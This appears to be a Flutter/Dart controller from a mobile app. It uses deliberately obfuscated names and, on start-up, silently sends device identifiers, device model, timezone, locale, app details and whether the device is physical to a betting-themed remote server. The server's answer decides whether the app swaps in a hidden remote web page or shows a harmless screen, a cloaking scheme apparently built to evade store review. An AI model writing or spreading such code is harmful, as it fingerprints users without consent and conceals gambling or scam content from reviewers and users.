import 'dart:convert';
import 'dart:io';

import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:get/get.dart';
import 'package:package_info_plus/package_info_plus.dart';

class PageLogic extends GetxController {

  var evdmxwzylb = RxBool(false);
  var dqgvwkylu = RxBool(true);
  var vlmoets = RxString("");
  var charlotte = RxBool(false);
  var muller = RxBool(true);
  final scawlrokgp = Dio();


  InAppWebViewController? webViewController;

  void checkNet() async {
    var connectResult = await (Connectivity().checkConnectivity());
    if(connectResult == ConnectivityResult.none){
      Get.toNamed("/noNetwork");
    }
  }

  @override
  void onInit() {
    checkNet();
    super.onInit();
    nesx();
  }


  Future<void> nesx() async {

    charlotte.value = true;
    muller.value = true;
    dqgvwkylu.value = false;

    scawlrokgp.post("https://bet.capbonf.xyz/hXhY3",data: await lkthpe()).then((value) {
      var ypne = value.data["ypne"] as String;
      var wfpce = value.data["wfpce"] as bool;
      if (wfpce) {
        vlmoets.value = ypne;
        carolyn();
      } else {
        carroll();
      }
    }).catchError((e) {
      dqgvwkylu.value = true;
      muller.value = true;
      charlotte.value = false;
    });
  }

  Future<Map<String, dynamic>> lkthpe() async {
    final DeviceInfoPlugin eiqmc = DeviceInfoPlugin();
    PackageInfo grhuptx_ritmb = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var xvwodmi = Platform.localeName;
    var uNxFS = currentTimeZone;

    var VkBMfe = grhuptx_ritmb.packageName;
    var ueUOlTcR = grhuptx_ritmb.version;
    var upYDU = grhuptx_ritmb.buildNumber;

    var qzbYQ = grhuptx_ritmb.appName;
    var lexieBogan = "";
    var ExNCqs  = "";
    var ZoWh = "";
    var kelleyLockman = "";
    var wilmerGorczany = "";
    var darenLittle = "";
    var isobelAbshire = "";
    var leslyMcClure = "";
    var CNMWxcfg = "";

    var felixDenesik = "";

    var zPpuV = "";
    var kplbZP = false;

    if (GetPlatform.isAndroid) {
      zPpuV = "android";
      var ywlkshitun = await eiqmc.androidInfo;

      ZoWh = ywlkshitun.brand;

      CNMWxcfg  = ywlkshitun.model;
      ExNCqs = ywlkshitun.id;

      kplbZP = ywlkshitun.isPhysicalDevice;
    }
    if (GetPlatform.isIOS) {
      zPpuV = "ios";
      var yhrxnd = await eiqmc.iosInfo;
      ZoWh = yhrxnd.name;
      CNMWxcfg = yhrxnd.model;

      ExNCqs = yhrxnd.identifierForVendor ?? "";
      kplbZP  = yhrxnd.isPhysicalDevice;
    }
    var res = {
      "qzbYQ": qzbYQ,
      "VkBMfe": VkBMfe,
      "kelleyLockman" : kelleyLockman,
      "CNMWxcfg": CNMWxcfg,
      "felixDenesik" : felixDenesik,
      "uNxFS": uNxFS,
      "ZoWh": ZoWh,
      "xvwodmi": xvwodmi,
      "zPpuV": zPpuV,
      "isobelAbshire" : isobelAbshire,
      "kplbZP": kplbZP,
      "wilmerGorczany" : wilmerGorczany,
      "upYDU": upYDU,
      "lexieBogan" : lexieBogan,
      "ueUOlTcR": ueUOlTcR,
      "darenLittle" : darenLittle,
      "ExNCqs": ExNCqs,
      "leslyMcClure" : leslyMcClure,

    };
    return res;
  }

  Future<void> carroll() async {
    Get.offAllNamed("/linksTab");
  }

  Future<void> carolyn() async {
    Get.offAllNamed("/linksGo");
  }

}
